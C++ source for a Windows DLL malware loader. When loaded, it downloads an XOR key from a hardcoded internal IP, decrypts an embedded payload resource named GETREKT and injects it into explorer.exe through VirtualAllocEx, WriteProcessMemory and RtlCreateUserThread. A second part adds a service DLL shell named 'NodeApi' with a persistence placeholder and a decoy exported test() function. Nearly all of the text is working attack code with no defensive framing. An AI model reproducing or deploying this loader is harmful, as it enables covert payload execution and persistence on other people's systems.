#if defined(_WIN32) || defined(_WIN64)
#include <windows.h>
#if defined(_MSC_VER)
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#endif
#endif
#include "pch.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <Windows.h>
#include "resource.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#pragma comment(lib, "ws2_32.lib")


typedef struct _CLIENT_ID
{
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

// Undocumented export from ntdll.dll - similar to CreateRemoteThread
typedef long (*_RtlCreateUserThread)(
    HANDLE,
    PSECURITY_DESCRIPTOR,
    BOOLEAN, ULONG,
    PULONG, PULONG,
    PVOID, PVOID,
    PHANDLE, PCLIENT_ID
);

_RtlCreateUserThread RtlCreateUserThread;

// XOR decryption function
void xorDecrypt(char* data, size_t dataSize, const std::vector<uint8_t>& key) {
    for (size_t i = 0; i < dataSize; i++) {
        data[i] ^= key[i % key.size()];
    }
}

// Check if file exists
bool keyExistsLocally(const char* keyFile) {
    std::ifstream file(keyFile, std::ios::binary);
    return file.good();
}

// Fetch key from server
bool fetchKeyFromServer(const char* serverAddress, int serverPort, const char* keyFile) {
    WSADATA wsaData;
    
    // Specify sockets version and initialize
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }

    // Create socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }

    // Configure socket
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);

    // Convert IP into binary form
    if (inet_pton(AF_INET, serverAddress, &serverAddr.sin_addr) <= 0) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    // Connect to the server
    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    // Define vector for storing the key - 512 bit.
    std::vector<uint8_t> keyBuffer(64);
    int bytesRead;

    // Create a file for writing
    std::ofstream file(keyFile, std::ios::out | std::ios::binary);
    if (!file.is_open()) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    // Receive key and write
    while ((bytesRead = recv(clientSocket, reinterpret_cast<char*>(keyBuffer.data()), keyBuffer.size(), 0)) > 0) {
        file.write(reinterpret_cast<const char*>(keyBuffer.data()), bytesRead);
    }

    // Close file
    file.close();

    // Close socket and cleanup Windows Socket API
    closesocket(clientSocket);
    WSACleanup();

    return true;
}

// Decrypt the stored resource and return
std::vector<uint8_t> DecryptResource(HGLOBAL resourceData, DWORD sz, const std::vector<uint8_t>& key) {
    char* resourcePtr = static_cast<char*>(LockResource(resourceData));

    // Create a copy of the resource data
    std::vector<uint8_t> decryptedData(resourcePtr, resourcePtr + sz);

    // Decrypt the copied data
    xorDecrypt(reinterpret_cast<char*>(decryptedData.data()), sz, key);

    UnlockResource(resourceData);

    return decryptedData;
}

// Get the process ID attaching the .dll
uint32_t getPID() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    uint32_t explorerPID = 0;
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
                explorerPID = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);

    return explorerPID;
}

// Our exploit function
void exploit(HINSTANCE hinstDLL) {
    HMODULE ntdll = LoadLibrary(L"ntdll.dll");
    HMODULE k32 = LoadLibrary(L"kernel32.dll");
    HANDLE Thread;
    CLIENT_ID cid;

    // Specify the destination of stored keyfile
    const char* keyFile = "C:\\ProgramData\\node.cache";

    // Specify the key distribution server IP
    const char* serverAddress = "10.10.24.9";

    // Specify the key distribution server port
    int serverPort = 65510;

    // Check if key exists locally
    if (!keyExistsLocally(keyFile)) {
        // Download the key
        if (!fetchKeyFromServer(serverAddress, serverPort, keyFile)) {
            return;
        }
    }

    // Open key from file system
    std::ifstream keyfs(keyFile, std::ios::binary);
    if (!keyfs.is_open()) {
        return;
    }

    // Create binary vector for storing key
    std::vector<uint8_t> XorKey(std::istreambuf_iterator<char>(keyfs), {});

    // Get resource from .dll
    HRSRC HResource = FindResource(hinstDLL, MAKEINTRESOURCE(IDR_GETREKT1), L"GETREKT");
    if (!HResource) {
        return;
    }

    // Get size of resource
    DWORD Size = SizeofResource(hinstDLL, HResource);

    // Load resource
    HGLOBAL Resource = LoadResource(hinstDLL, HResource);

    if (!Resource) {
        return;
    }

    // Decrypt the resource.
    std::vector<uint8_t> Payload = DecryptResource(Resource, Size, XorKey);

    uint32_t PID = getPID();

    // Open the process
    HANDLE Process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, PID);
    
    // Allocate memory in the process
    LPVOID Memory = (LPVOID)VirtualAllocEx(Process, NULL, Payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Write to process memory
    WriteProcessMemory(Process, Memory, Payload.data(), Payload.size(), NULL);

    // Set memory protection to READ EXECUTE
    DWORD OldProtect;
    VirtualProtectEx(Process, Memory, Size, PAGE_EXECUTE_READ, &OldProtect);

    // Create remote thread - RtlCreateUserThread method
    RtlCreateUserThread = (_RtlCreateUserThread)GetProcAddress(ntdll, "RtlCreateUserThread");
    RtlCreateUserThread(Process, NULL, false, 0, NULL, NULL, Memory, NULL, &Thread, &cid);

    // Wait for thread, infinitelly
    WaitForSingleObject(Thread, INFINITE);

    // Close thread after execution
    CloseHandle(Thread);

    // Clean up memory
    VirtualFreeEx(Process, Memory, Size, MEM_RELEASE | MEM_DECOMMIT);
}

BOOL APIENTRY DllMain(HINSTANCE  hinstDLL, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        exploit(hinstDLL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

#include "pch.h"
#define SVCNAME TEXT("NodeApi")

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;
HANDLE stopEvent = NULL;

VOID UpdateServiceStatus(DWORD currentState)
{
    serviceStatus.dwCurrentState = currentState;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}

DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context)
{
    switch (controlCode)
    {
        case SERVICE_CONTROL_STOP:
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            SetEvent(stopEvent);
            break;
        case SERVICE_CONTROL_SHUTDOWN:
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            SetEvent(stopEvent);
            break;
        case SERVICE_CONTROL_PAUSE:
            serviceStatus.dwCurrentState = SERVICE_PAUSED;
            break;
        case SERVICE_CONTROL_CONTINUE:
            serviceStatus.dwCurrentState = SERVICE_RUNNING;
            break;
        case SERVICE_CONTROL_INTERROGATE:
            break;
        default:
            break;
    }

    UpdateServiceStatus(SERVICE_RUNNING);

    return NO_ERROR;
}

VOID ExecuteServiceCode()
{
    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    UpdateServiceStatus(SERVICE_RUNNING);

    // #####################################
    // your persistence code here
    // #####################################

    while (1)
    {
        WaitForSingleObject(stopEvent, INFINITE);
        UpdateServiceStatus(SERVICE_STOPPED);
        return;
    }
}

extern "C" __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR * argV)
{
    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);

    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    serviceStatus.dwServiceSpecificExitCode = 0;

    UpdateServiceStatus(SERVICE_START_PENDING);
    ExecuteServiceCode();
}


extern "C" __declspec(dllexport) void test()
{
    // Placeholder for the application importing the .dll - the function being originally called
}
